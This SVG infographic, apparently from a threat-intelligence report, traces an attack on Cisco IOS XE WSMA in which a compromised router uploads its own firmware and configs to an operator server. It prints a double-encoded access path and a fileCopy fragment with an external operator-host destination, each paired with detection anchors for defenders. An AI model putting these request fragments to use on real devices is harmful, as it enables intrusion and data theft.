<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 1640" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif">
  <!--
    Layout family: vertical-chain (4 cards)
    Subject: WSMA fileCopy driven for self-directed exfiltration
    Campaign: WebLogicDeserialization-TelecomHarvester-13.140.145.210
  -->
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#cccccc"/>
    </marker>
    <filter id="cardShadow" x="-2%" y="-2%" width="104%" height="108%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/>
    </filter>
  </defs>

  <rect width="1000" height="1640" fill="#161616"/>
  <rect x="0.5" y="0.5" width="999" height="1639" fill="none" stroke="#2a2a2a" stroke-width="1"/>

  <!-- =========== TITLE =========== -->
  <text x="500" y="62" text-anchor="middle" font-size="40" font-weight="700" fill="#ffffff">The Router Exfiltrates Itself</text>
  <text x="500" y="106" text-anchor="middle" font-size="24" fill="#f5f5f5">WSMA fileCopy makes the victim device the HTTP client</text>
  <text x="500" y="140" text-anchor="middle" font-size="18" fill="#cccccc">No shell is ever taken on the device. Confirmed from the operator's own listener log.</text>
  <line x1="60" y1="166" x2="940" y2="166" stroke="#2a2a2a" stroke-width="1"/>

  <!-- =========== STEP 1 — ORANGE: initial access =========== -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="196" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="196" width="880" height="46" rx="8" fill="#f97316"/>
    <rect x="60" y="229" width="880" height="13" fill="#f97316"/>
    <text x="80" y="227" font-size="17" font-weight="700" fill="#111111" letter-spacing="0.5">STEP 1</text>
    <text x="200" y="227" font-size="23" font-weight="600" fill="#111111">Reach the internal WSMA backend</text>
    <text x="80" y="282" font-size="21" fill="#ffffff">A double-encoded path slips the route filter, because nginx and IOSd each decode once.</text>
    <text x="80" y="316" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">POST /%2577eb%2575i_%2577sma_Http</text>
    <text x="80" y="350" font-size="18" fill="#e5e5e5">Public proofs of concept use a single-encoded lowercase form. This spelling is the operator's own.</text>
    <text x="80" y="384" font-size="18" fill="#fb923c" font-weight="600">Detect: the doubled path, distinct from the generic CVE-2023-20198 URI</text>
  </g>
  <line x1="500" y1="416" x2="500" y2="456" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- =========== STEP 2 — RED: operator code =========== -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="462" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="462" width="880" height="46" rx="8" fill="#dc2626"/>
    <rect x="60" y="495" width="880" height="13" fill="#dc2626"/>
    <text x="80" y="493" font-size="17" font-weight="700" fill="#ffffff" letter-spacing="0.5">STEP 2</text>
    <text x="200" y="493" font-size="23" font-weight="600" fill="#ffffff">Send fileCopy, not command exec</text>
    <text x="80" y="548" font-size="21" fill="#ffffff">The SOAP body is scoped to the filesystem service rather than the exec service.</text>
    <text x="80" y="582" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">urn:cisco:wsma-filesystem  ·  srcURL=nvram:/  ·  dstURL=http://operator-host/</text>
    <text x="80" y="616" font-size="18" fill="#e5e5e5">Every public write-up of this bypass describes the exec path. This one names the file to move.</text>
    <text x="80" y="650" font-size="18" fill="#fb923c" font-weight="600">Detect: a WSMA filesystem request naming an external dstURL</text>
  </g>
  <line x1="500" y1="682" x2="500" y2="722" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- =========== STEP 3 — YELLOW: staging / the inversion =========== -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="728" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="728" width="880" height="46" rx="8" fill="#eab308"/>
    <rect x="60" y="761" width="880" height="13" fill="#eab308"/>
    <text x="80" y="759" font-size="17" font-weight="700" fill="#111111" letter-spacing="0.5">STEP 3</text>
    <text x="200" y="759" font-size="23" font-weight="600" fill="#111111">The direction of travel inverts</text>
    <text x="80" y="814" font-size="21" fill="#ffffff">The router obeys, opening its own outbound HTTP connection to the operator's server.</text>
    <text x="80" y="848" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">victim device  ==PUT==&gt;  operator server</text>
    <text x="80" y="882" font-size="18" fill="#e5e5e5">Nothing is pulled. The device pushes, so the traffic originates inside the trusted network.</text>
    <text x="80" y="916" font-size="18" fill="#fb923c" font-weight="600">Detect: outbound HTTP PUT from a network device to a non-management host</text>
  </g>
  <line x1="500" y1="948" x2="500" y2="988" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- =========== STEP 4 — DEEP RED: endgame =========== -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="994" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="994" width="880" height="46" rx="8" fill="#7f1d1d"/>
    <rect x="60" y="1027" width="880" height="13" fill="#7f1d1d"/>
    <text x="80" y="1025" font-size="17" font-weight="700" fill="#ffffff" letter-spacing="0.5">STEP 4</text>
    <text x="200" y="1025" font-size="23" font-weight="600" fill="#ffffff">424,946,514 bytes leave in one day</text>
    <text x="80" y="1080" font-size="21" fill="#ffffff">100 uploads on 2026-07-24, receipted by the operator's own listener.</text>
    <text x="80" y="1114" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">User-Agent: cisco-IOS  on every single request</text>
    <text x="80" y="1148" font-size="18" fill="#fb923c" font-weight="600">Taken: the 356 MB firmware image, 65 nginx core dumps, 19 configs</text>
    <text x="80" y="1180" font-size="18" fill="#fb923c" font-weight="600">Including cwmp_inventory, the device's TR-069 provisioning record</text>
  </g>

  <!-- =========== FOOTER =========== -->
  <line x1="60" y1="1260" x2="940" y2="1260" stroke="#2a2a2a" stroke-width="1"/>
  <text x="500" y="1294" text-anchor="middle" font-size="18" font-weight="600" fill="#ffffff">Detection anchors:  User-Agent: cisco-IOS on outbound PUT  ·  the double-encoded WSMA path</text>
  <text x="500" y="1324" text-anchor="middle" font-size="18" font-weight="600" fill="#ffffff">urn:cisco:wsma-filesystem with an external dstURL</text>
  <text x="500" y="1360" text-anchor="middle" font-size="15" fill="#cccccc">The device generates this traffic itself, so it survives the anti-forensics applied on the host.</text>
  <text x="500" y="1392" text-anchor="middle" font-size="14" fill="#888888">Legend: orange = initial access · red = operator code · yellow = staging · deep red = endgame</text>
</svg>
